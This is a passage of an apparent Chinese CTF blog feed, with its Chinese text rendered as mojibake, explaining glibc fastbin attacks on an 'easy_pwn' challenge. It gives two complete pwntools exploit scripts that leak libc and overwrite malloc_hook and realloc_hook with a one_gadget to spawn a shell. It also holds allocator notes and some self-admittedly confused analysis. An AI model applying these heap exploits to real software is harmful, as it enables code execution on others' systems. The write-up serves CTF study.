= '</span> + hex(result))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„0x3c4b78æ˜¯æ ¹æ®leakå‡ºçš„ unsorted bin åœ°å€å‡å» /proc/çº¿ç¨‹å·/mapsé‡Œçš„libcåŸºå€å¾—åˆ°çš„ã€‚</p><p>å› ä¸ºåç§»é‡æ˜¯ä¸å˜çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x40</span>))</span><br><span class="line">gdb.attach(sh)</span><br></pre></td></tr></table></figure><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571553593599.png"><p>æ­¤å¤„ä¿®æ”¹bkä¸º__free_hook - 0x40çš„åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571556976417.png"> <img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571553628633.png"> <p>æ­¤å¤„ä¸ºäº†ä½¿å¾—fasted bin 0x70é‡Œé¢å­˜åœ¨freeåçš„å †å—ï¼Œä½¿å¾—åé¢fdæ”»å‡»æˆåŠŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x33</span>))</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹fdä½</p><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571557000576.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br></pre></td></tr></table></figure><img src="/2019/10/28/Â–fastedbin-attack-æ¢ç©¶/1571554995553.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x23</span> + <span class="number">8</span>, <span class="string">''</span> * <span class="number">0x23</span> + p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œæˆ‘æ‘Šç‰Œäº†ï¼Œæˆ‘æ˜¯å‚»é€¼ï¼Œçœ‹ä¸æ‡‚ä¸Šé¢é‚£ä¸ªä¿®æ”¹BKçš„æ“ä½œï¼Œä¸Šé¢æ˜¯èƒ¡ä¹±åˆ†æçš„ã€‚</p><p>åˆšå¥½ï¼Œä¹Ÿå€Ÿç”¨è¿™é“é¢˜æ¥å°è¯•ä¸åŒçš„æ‰“æ³•ï¼</p><h5 id="ç¬¬ä¸€ç§-malloc-hook"><a href="#ç¬¬ä¸€ç§-malloc-hook" class="headerlink" title="ç¬¬ä¸€ç§:malloc_hook"></a>ç¬¬ä¸€ç§:malloc_hook</h5><p>mallocå‡½æ•°ä¼šé¦–å…ˆæ£€æŸ¥malloc_hookçš„å€¼ï¼Œè‹¥ä¸ä¸º0åˆ™ä¼šè°ƒç”¨ä»–ã€‚è‹¥æˆ‘ä»¬èƒ½é€šè¿‡å†…å­˜å†™å…¥malloc_hookå³å¯å®ç°ä»»æ„åœ°å€è·³è½¬!<br>å¯é€šè¿‡fastbin_attackï¼Œæˆ‘ä»¬ä»malloc_hookå¾€ä¸Šé¢è§‚å¯Ÿï¼Œä¼šå‘ç°åœ¨malloc_hookä¸Šæ–¹å­˜åœ¨ä¸€ä¸ª0x7fxxxxxxçš„æ•°æ®ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é”™ä½ï¼Œåˆšå¥½ä½¿å¾—7fçš„ä½ç½®ç§»åŠ¨åˆ°ç±»ä¼¼äºæ­£å¸¸å †å—çš„sizeçš„ä½ç½®ä»è€ŒæˆåŠŸå†™å…¥chunkã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#sh = remote('node3.buuoj.cn',28685)</span></span><br><span class="line"><span class="comment">#libc = ELF('./x64_libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil("choice: ")</span></span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_addr +<span class="number">0x3c4b10</span></span><br><span class="line">log.success(<span class="string">'malloc_hook = '</span> + hex(malloc_hook))</span><br><span class="line">ong_a = libc_addr + <span class="number">0x4526a</span></span><br><span class="line"><span class="comment">#edit(2, 0x10, p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x40))</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">edit(<span class="number">2</span>, len(payload), payload)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#payload='a'*0xb+p64(ong_a)+p64(libc_addr+libc.symbols["realloc"])</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x13</span> +p64(one_a)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">edit(<span class="number">5</span>, len(payload), payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h5 id="ç¬¬äºŒç§-realloc-hook"><a href="#ç¬¬äºŒç§-realloc-hook" class="headerlink" title="ç¬¬äºŒç§:realloc_hook"></a>ç¬¬äºŒç§:realloc_hook</h5><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œone_gadgetè¦æƒ³æˆåŠŸå¾—éœ€è¦ç¯å¢ƒçš„åŒ¹é…ï¼Œé‚£ä¹ˆæœ‰çš„æ—¶å€™ä¼šé‡ä¸Šç¯å¢ƒåŸå› è€Œå¯¼è‡´one_gadgetå…¨éƒ¨ä¸å¯ç”¨ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦realloc_hookæ¥è°ƒæ•´å †æ ˆä½¿å¾—one_gadgetå¯ç”¨ã€‚</p><p>reallocå‡½æ•°åœ¨å‡½æ•°èµ·å§‹ä¼šæ£€æŸ¥realloc_hookçš„å€¼æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0åˆ™è·³è½¬è‡³realloc_hookæŒ‡å‘åœ°å€ã€‚<br>realloc_hookåŒmalloc_hookç›¸é‚»(ä¹Ÿå°±æ˜¯malloc_hook-0x08)ï¼Œæ•…å¯é€šè¿‡fastbin attackä¸€åŒä¿®æ”¹ä¸¤ä¸ªå€¼ã€‚</p><p><img src="https://bbs.pediy.com/upload/attach/201901/3_8D489B4GNW7QYK4.jpg" alt="img"></p><p><img src="https://bbs.pediy.com/upload/attach/201901/3_CPMMKR8DZNMSN73.jpg" alt="img"></p><p>æµç¨‹ä¸ºpushå¯„å­˜å™¨ï¼Œæœ€åå…¨éƒ¨popå‡ºæ¥è·³è½¬è‡³realloc_hookçš„å€¼ã€‚<br>å°†realloc_hookè®¾ç½®ä¸ºé€‰æ‹©å¥½çš„one_gadgetï¼Œå°†malloc_hookè®¾ç½®ä¸ºreallocå‡½æ•°å¼€å¤´æŸä¸€pushå¯„å­˜å™¨å¤„ã€‚pushå’Œpopçš„æ¬¡æ•°æ˜¯ä¸€è‡´çš„ï¼Œè‹¥pushæ¬¡æ•°å‡å°‘åˆ™ä¼šå‹ä½å †æ ˆï¼Œæ”¹å˜æ ˆç¯å¢ƒã€‚è¿™æ—¶one_gadgetå°±ä¼šå¯ä»¥ä½¿ç”¨ã€‚å…·ä½“è¦å‹ä½æ ˆå¤šå°‘è¦æ ¹æ®ç¯å¢ƒå†³å®šï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå°äº48å­—èŠ‚å†…æˆ–72å­—èŠ‚çš„å †æ ˆè°ƒæ•´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#sh = remote('node3.buuoj.cn',28685)</span></span><br><span class="line"><span class="comment">#libc = ELF('./x64_libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil("choice: ")</span></span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_addr +<span class="number">0x3c4b10</span></span><br><span class="line">log.success(<span class="string">'malloc_hook = '</span> + hex(malloc_hook))</span><br><span class="line">ong_a = libc_addr + <span class="number">0x4526a</span></span><br><span class="line"><span class="comment">#edit(2, 0x10, p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x40))</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">edit(<span class="number">2</span>, len(payload), payload)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xb</span>+p64(ong_a)+p64(libc_addr+libc.symbols[<span class="string">"realloc"</span>])</span><br><span class="line"><span class="comment">#payload = 'a'*0x13 +p64(one_a)</span></span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">edit(<span class="number">5</span>, len(payload), payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="fasted-bin-attackæ³¨æ„äº‹é¡¹"><a href="#fasted-bin-attackæ³¨æ„äº‹é¡¹" class="headerlink" title="fasted bin attackæ³¨æ„äº‹é¡¹"></a>fasted bin attackæ³¨æ„äº‹é¡¹</h2><p>ï¼ˆå®é™…ä¸Šåªæ˜¯è‡ªå·±ç¬¨ï¼Œè®°å½•ä¸€ç‚¹fasted binçš„å„ç§æ£€æµ‹ï¼Œä»¥åŠå„ç§ç»•è¿‡æ£€æµ‹ï¼ŒæˆåŠŸattackçš„æ–¹æ³•ï¼‰</p><h3 id="ï¼ˆä¸€ï¼‰"><a href="#ï¼ˆä¸€ï¼‰" class="headerlink" title="ï¼ˆä¸€ï¼‰"></a>ï¼ˆä¸€ï¼‰</h3><p>å…ˆæ¥çœ‹ptmallocçš„å“åº”ç”¨æˆ·å†…å­˜åˆ†é…è¦æ±‚çš„å…·ä½“æ­¥éª¤ï¼š</p><blockquote><p>1) è·å–åˆ†é…åŒºçš„é”ï¼Œä¸ºäº†é˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªåˆ†é…åŒºï¼Œåœ¨è¿›è¡Œåˆ†é…ä¹‹å‰éœ€è¦ å–å¾—åˆ†é…åŒºåŸŸçš„é”ã€‚çº¿ç¨‹å…ˆæŸ¥çœ‹çº¿ç¨‹ç§æœ‰å®ä¾‹ä¸­æ˜¯å¦å·²ç»å­˜åœ¨ä¸€ä¸ªåˆ†é…åŒºï¼Œå¦‚æœå­˜ åœ¨å°è¯•å¯¹è¯¥åˆ†é…åŒºåŠ é”ï¼Œå¦‚æœåŠ é”æˆåŠŸï¼Œä½¿ç”¨è¯¥åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œå¦åˆ™ï¼Œè¯¥çº¿ç¨‹æœ ç´¢åˆ†é…åŒºå¾ªç¯é“¾è¡¨è¯•å›¾è·å¾—ä¸€ä¸ªç©ºé—²ï¼ˆæ²¡æœ‰åŠ é”ï¼‰çš„åˆ†é…åŒºã€‚å¦‚æœæ‰€æœ‰çš„åˆ†é…åŒºéƒ½ å·²ç»åŠ é”ï¼Œé‚£ä¹ˆ ptmalloc ä¼šå¼€è¾Ÿä¸€ä¸ªæ–°çš„åˆ†é…åŒºï¼ŒæŠŠè¯¥åˆ†é…åŒºåŠ å…¥åˆ°å…¨å±€åˆ†é…åŒºå¾ª ç¯é“¾è¡¨å’Œçº¿ç¨‹çš„ç§æœ‰å®ä¾‹ä¸­å¹¶åŠ é”ï¼Œç„¶åä½¿ç”¨è¯¥åˆ†é…åŒºè¿›è¡Œåˆ†é…æ“ä½œã€‚å¼€è¾Ÿå‡ºæ¥çš„ æ–°åˆ†é…åŒºä¸€å®šä¸ºéä¸»åˆ†é…åŒºï¼Œå› ä¸ºä¸»åˆ†é…åŒºæ˜¯ä»çˆ¶è¿›ç¨‹é‚£é‡Œç»§æ‰¿æ¥çš„ã€‚å¼€è¾Ÿéä¸»åˆ† é…åŒºæ—¶ä¼šè°ƒç”¨ mmap()åˆ›å»ºä¸€ä¸ª sub-heapï¼Œå¹¶è®¾ç½®å¥½ top chunkã€‚ </p><p>2) å°†ç”¨æˆ·çš„è¯·æ±‚å¤§å°è½¬æ¢ä¸ºå®é™…éœ€è¦åˆ†é…çš„ chunk ç©ºé—´å¤§å°ã€‚  </p><p>3) åˆ¤æ–­æ‰€éœ€åˆ†é…chunkçš„å¤§å°æ˜¯å¦æ»¡è¶³chunk_size &lt;= max_fast (max_fast é»˜è®¤ä¸º 64B)ï¼Œ å¦‚æœæ˜¯çš„è¯ï¼Œåˆ™è½¬ä¸‹ä¸€æ­¥ï¼Œå¦åˆ™è·³åˆ°ç¬¬ 5 æ­¥ã€‚ </p><p>4) é¦–å…ˆå°è¯•åœ¨ fast bins ä¸­å–ä¸€ä¸ªæ‰€éœ€å¤§å°çš„ chunk åˆ†é…ç»™ç”¨æˆ·ã€‚å¦‚æœå¯ä»¥æ‰¾åˆ°ï¼Œåˆ™åˆ† é…ç»“æŸã€‚å¦åˆ™è½¬åˆ°ä¸‹ä¸€æ­¥ã€‚ </p></blockquote><p>å…¶å®çœ‹åˆ°ç¬¬å››æ­¥å°±å¯ï¼Œæˆ‘ä»¬åªè®²è¿°fast binèŒƒå›´å†…çš„ã€‚</p><h3 id="ï¼ˆäºŒï¼‰"><a href="#ï¼ˆäºŒï¼‰" class="headerlink" title="ï¼ˆäºŒï¼‰"></a>ï¼ˆäºŒï¼‰</h3><p>fast binæ˜¯ä¸€ä¸ªå•é“¾è¡¨ï¼Œæ˜¯ä¸€ä¸ªLIFO(<em>Last in, first out</em>åè¿›å…ˆå‡º)</p><p>å³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>)#chunk1;</span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>)#chunk2;</span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x40</span>)#chunk3;</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">free</span>(ptr3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä»¿ç…§ã€Šglibcå†…å­˜ç®¡ç†ã€‹ä¸€ä¹¦ä¸­å¯¹äºbinsæ•°ç»„çš„ç»“æ„æ¥å±•ç¤ºfast biné“¾è¡¨</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6%5Cimage-20191208011303551.png" alt="image-20191208011303551"></p><p>åœ¨fast binçš„é“¾è¡¨ä¸­ç»“æ„ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">fast bin &lt;|-- chunk1</span><br><span class="line">chunk1 : fd = </span><br><span class="line">chunk1 : bk()</span><br><span class="line">chunk1 &lt;|-- chunk2</span><br><span class="line">chunk2 : fd = chunk1</span><br><span class="line">chunk2 : bk()</span><br><span class="line">chunk2 &lt;|-- chunk3</span><br><span class="line">chunk3 : fd = chunk2</span><br><span class="line">chunk3 : bk()</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿›è¡Œè°ƒç”¨çš„æ—¶å€™ï¼Œæ˜¯å…ˆå–ç”¨chunk3å†å–ç”¨chunk2å†å–ç”¨chunk1ã€‚è¿™å°±æ˜¯FILOã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆæ–°freeçš„chunkä¸ç›´æ¥æ’åˆ°é è¿‘fast binçš„åœ°æ–¹ï¼Œå¦‚æœç›´æ¥æ’åˆ°é è¿‘fast binçš„åœ°æ–¹è¯æ¯æ¬¡éƒ½è¦è¿­ä»£åˆ°æœ€åä¸€ä¸ªchunkç„¶åæŠŠå®ƒçš„fdèµ‹å€¼ä¸ºæ–°çš„chunkçš„åœ°å€ï¼Œè€Œä½¿ç”¨LIFOï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹fastbinsY[0]æŒ‡é’ˆçš„å€¼å’Œæ–°çš„chunkçš„å€¼ï¼ŒèŠ±è´¹åœ¨fastbiné“¾æœ‰å¾ˆå¤šçš„æ—¶å€™è‚¯å®šæ˜¯æ›´å°‘çš„</p><h3 id="ï¼ˆä¸‰ï¼‰"><a href="#ï¼ˆä¸‰ï¼‰" class="headerlink" title="ï¼ˆä¸‰ï¼‰"></a>ï¼ˆä¸‰ï¼‰</h3><p>æ­¤æ—¶è®²è¿°çš„æ˜¯malloc - freeåçš„å†æ¬¡mallocç¯èŠ‚</p><p>åœ¨æˆ‘ä»¬è¿›è¡Œfasted bin attack æ‰“ hookï¼Œä» fastbin ä¸­å–å‡º chunk çš„æ—¶å€™ä¼šå¯¹ chunk çš„size åšæ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªä»»æ„ä½ç½®çš„ chunk çš„ size ä½å¿…é¡»æ„é€ ã€‚</p><p>æ¥çœ‹fastbinè·å–indexçš„æºç </p><blockquote><p>/* offset 2 to use otherwise unindexable first 2 bins */<br> #define fastbin_index(sz) \   </p><p>â€‹    ((((unsigned int)(sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) </p><p>å® fastbin_index(sz)ç”¨äºè·å¾— fast bin åœ¨ fast bins æ•°ç»„ä¸­çš„ indexï¼Œç”±äº bin[0]å’Œ bin[1]ä¸­ çš„chunkä¸å­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦å‡2ã€‚</p></blockquote><p>ä¸ªäººç†è§£ï¼šåœ¨64ä½é‡Œä¹Ÿå°±æ˜¯(sz) &gt;&gt; 4è·å–Indexã€‚å› æ­¤å¾ˆå¤šæ—¶å€™å°±å¯ä»¥æ„é€ 0x7få¤§å°çš„fastbinï¼Œä»£æ›¿å¾ˆéš¾æ‰¾åˆ°çš„0x71\0x70å¤§å°çš„fastbinã€‚</p><p>ä¸¾ä¸ªä¾‹å­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; 0x602078</span><br></pre></td></tr></table></figure><p>fastbinåœ¨mallocçš„æ—¶å€™ä¼šå¯¹sizeè¿›è¡Œæ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥address+8çš„å€¼æ˜¯å¦ä¸ºåˆæ³•sizeã€‚ï¼ˆå³æ£€æŸ¥0x602080ï¼‰</p><p>è‡³äºæ£€æµ‹çš„æ–¹æ³•ï¼Œå°±æ˜¯ä¸Šé¢è·å–indexçš„æºç ï¼Œè¿›è¡Œ&gt;&gt;è¿ç®—ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆå¯ä»¥åˆ©ç”¨unsorted binä»»æ„åœ°å€å†™ï¼Œé…åˆfasted bin attackçš„åŸå› äº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>360èµ›</title>
      <link href="/2019/10/19/360%E8%B5%9B/"/>
      <url>/2019/10/19/360%E8%B5%9B/</url>
      
